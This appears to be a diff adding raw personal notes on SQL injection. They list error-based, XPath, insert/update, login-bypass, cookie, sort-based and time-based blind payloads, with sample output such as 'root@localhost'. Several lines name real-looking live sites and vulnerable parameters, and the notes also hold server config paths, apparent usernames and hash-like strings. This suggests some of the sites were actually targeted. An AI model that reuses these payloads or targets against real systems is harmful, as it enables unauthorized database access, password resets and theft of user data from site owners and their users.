@@ -1,0 +1,227 @@
+http://tgcat.mit.edu/tgPlot.php?t=P&i=5424
+
+You have an error in your SQL syntax;
+ The used SELECT statements have a different number of columns
+
+Double Query : 
+
+	union+select+1,count(*),concat(0x3a,user(),floor(rand()*2))a+from+information_schema.tables+group+by+a
+	union+select+1,count(*),concat(0x3a,database(),floor(rand()*2))a+from+information_schema.tables+group+by+a
+	union+select+1,count(*),concat(0x3a,(select+table_name+from+information_schema.tables+where+TABLE_SCHEMA=database()),floor(rand()*2))a+from+information_schema.tables+group+by+a
+	and(select+1+FROM(select+count(*),concat((select+(select+concat(user()))+FROM+information_schema.tables+LIMIT+0,1),floor(rand(0)*2))x+FROM+information_schema.tables+GROUP+BY+x)a)
+	
+	
+	count(*) -> num_rows
+	
+	count(*) as c -> c
+	count(*)b -> b
+	
+	concat('ali','reza') -> alireza
+	
+	rand()  0.0 to 1.0
+	rand() * 2 -> 0.0 to  2.0
+	
+	floor(1.9) -> 1
+	floor(1.1) ->
+	
+	group by 
+	
+	count(*) - group by - rand()
+	
+	1 - order by number of columns
+	
+		union+select+1,count(*),concat(0x3a,user(),floor(rand()*2))a+from+information_schema.tables+group+by+a
+
+
+	
+	union+select 1,count(*),concat(':',user(),floor(rand()*2))a,4,5,6,7,8,9 from+information_schema.tables+group+by+a
+	
+	:root@localhost1
+	:root@localhost1
+	:root@localhost0
+	:root@localhost0
+	
+	union+select 1,count(*),concat(':',(select table_name from information_schema.tables limit 0,1),floor(rand()*2))a,4,5,6,7,8,9 from+information_schema.tables+group+by+a
+
+
+	
+XPath :
+
+	Xpath :
+				<users>
+					<user>	
+							<id>1</id>
+					</user>
+					<user>	
+							<id>2</id>
+					</user>					
+				</users>
+				
+				/user/2
+
+	and extractvalue(1,concat(':',version(),':'))
+	
+			1,':10.1.35-MariaDB:'
+	
+	and extractvalue(1,concat(0x3a,version(),0x3a))
+	and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables LIMIT 0,1),0x3a))
+	and updatexml(1, concat(':', version()),1)
+	and updatexml(1, concat(0x3a, version()),1)
+	and updatexml(1, concat(0x3a, (select username from users LIMIT 0,1)),1)
+	
+	
+	
+http://www.askvancouver.ca/user.php?uid=405
+
+
+http://www.cambridgeenglishevents.org/SouthernEurope/register.php?id=1
+
+
+PZ-.-RnR+25
+/etc/nginx/nginx.config
+
+/etc/nginx/sites-enabled/default
+/etc/nginx/sites-enabled/cambridgeenglishevents.org
+/etc/nginx/sites-enabled/www.cambridgeenglishevents.org
+
+/var/virtual/www.cambridgeenglishevents.org/index.php
+
+
+/var/virtual/www.cambridgeenglishevents.org/app/models/EventModel.php
+
+$q = "INSERT INTO users (email,fn,ln,username,password,is_admin) 
+	VALUES ('$email','$fn','$ln','$username','pass',1)#,'0')";
+
+pass',1)#
+
+
+insert into message (NULL,(select user()))
+
+
+INSERT INTO messages (title,msg,user_agent,referer) 
+			VALUES ('ali',(select user())','','','')
+
+
+ali',(select user()),'1','2')#
+ali',(select concat(username, ,password) from users LIMIT 0,1),'1','2')#
+
+
+
+UPDATE users SET fn = 'ali' , ln = 'reza',password='test'  where id = 1  # ' WHERE id = '$id'
+
+
+admin' or 1=1 #
+
+
+reza',password='test'  where id = 1  #
+
+
+stack query or multiple query
+
+select 1;select2;
+
+select * from users where id = 1;sql
+
+
+
+delete from orders where order_id = 520;
+
+1';update+users+set+password='jafar'%23
+
+
+
+movetoottawa
+
+111
+
+a@a.com',,pwd=123 where id = 405 #
+a@a.com',password=md5('1234') where id = 111 #
+a@a.com',password=md5('1234') where id = 111 /*
+
+email ='a@a.com',password=md5('1234') where id = 111 /*   '
+
+
+ '' 1234567890123456789012345678901234567890' ''
+
+
+robinq16
+
+
+
+askcanadausers
+
+3590cb8af0bbb9e78c343b52b93773c
+ea2a483e0980ebf1e154b84e2e68c123
+ea2a483e0980ebf1e154b84e2e68c12
+
+
+qnibor
+
+movetoottawa
+
+''   '   ''
+
+
+HTTP State Less
+Cookie 
+a.php
+b.php
+
+
+uid=120
+uid=120'
+
+document.cookie='username=admin'
+
+
+document.cookie = "hermosoft_admin_name=' or 1=1 #"
+	
+http://www.target.com/admin/dashboard.php
+
+
+http://www.valueb2b.com/admin/
+
+
+
+Sort Injection :
+
+	order by id and extractvalue(1,concat(':',version(),':'))
+	
+	
+	select * from users order by rand(0)
+	select * from users order by rand(1)
+	
+	
+24 :
+	Sort Injection : 
+		rand(0)
+		rand(1)
+		
+		left("ali",1) -> a
+		left("ali",2) -> al
+		left("ali",3) -> ali
+
+
+     	rand(left(user(),1)='r') 
+		rand(ascii(left(database(),1))=115) 
+		rand(left(database(),1)='e')
+		rand(ascii(left(database(),1))=ascii('s'))
+		
+		rand(ascii(right(database(),1))=121)
+		
+		
+		rand(if(substr(user(),1,1)='r', sleep(1),null))
+		rand(if(substr(user(),1,1)='r', BENCHMARK(10000000, rand()),null))
+		
+		rand((substring(database(),1,1))='a')	
+		
+		
+25 :
+	id'+,+rand(0)%23
+	id'+,+rand(1)%23
+	id'+,+rand(if(substr(user(),1,1)='r', BENCHMARK(10000000, rand()),null))%23
+	
+	
+	order by id asc,fn desc,ln asc
+
+
